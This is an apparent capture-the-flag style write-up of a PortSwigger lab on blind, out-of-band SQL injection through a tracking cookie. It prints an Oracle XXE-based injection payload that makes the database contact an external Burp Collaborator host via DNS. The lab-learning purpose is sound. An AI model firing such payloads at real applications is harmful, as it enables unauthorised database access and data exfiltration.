# Blind SQL injection with out-of-band interaction

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band), you'll learn: Blind SQL injection with out-of-band interaction! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to cause a DNS lookup to Burp Collaborator.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301120135.png)

**Cookies:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301120205.png)

When we go to `/`, it'll set a new cookie called `TrackingId`.

This looks like a tracking cookie for analytics.

The SQL query may looks like this:

```sql
SELECT TrackingId FROM tracking WHERE TrackingId = '<our_cookie_value>'
```

**That being said, we can try to perform SQL injection.**

**To do so, I'll try to trigger an SQL query error:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301120405.png)

However, it seems like we don't recieve any response when we modified the tracking cookie.

Maybe carries out the SQL query **asynchronously**?

The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to [Burp Suite Professional](https://portswigger.net/burp/pro) with no configuration required.

### Blind SQL injection with DNS lookup

**In the PortSwigger's [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet), there's a DNS lookup payloads:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301120657.png)

Since we don't know which DBMS (Database Management System) is using, we need to try them all one by one.

**First, go to Burp Suite's Collaborator and click "Copy to clipboard":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301120850.png)

**Then, we'll try Oracle XXE vulnerability to trigger a DNS lookup:**
```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://sqmxgqkqk0lopbi04l88x96v2m8dw4kt.oastify.com/"> %remote;]>'),'/l') FROM dual
```

**Payload:**
```sql
1G73QrMQUaCdamOl' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sqmxgqkqk0lopbi04l88x96v2m8dw4kt.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

**The SQL query may become:**
```sql
SELECT TrackingId FROM tracking WHERE TrackingId = '1G73QrMQUaCdamOl' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://sqmxgqkqk0lopbi04l88x96v2m8dw4kt.oastify.com/"> %remote;]>'),'/l') FROM dual--'
```

Let's send the payload!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301124253.png)

> Note: The payload needs to be URL encoded.

**Burp Suite's Collaborator:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301124332.png)

We've recieved 4 DNS lookups! Which means the `TrackingId` cookie is vulnerable to out-of-band SQL injection!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-16/images/Pasted%20image%2020230301124416.png)

# What we've learned:

1. Blind SQL injection with out-of-band interaction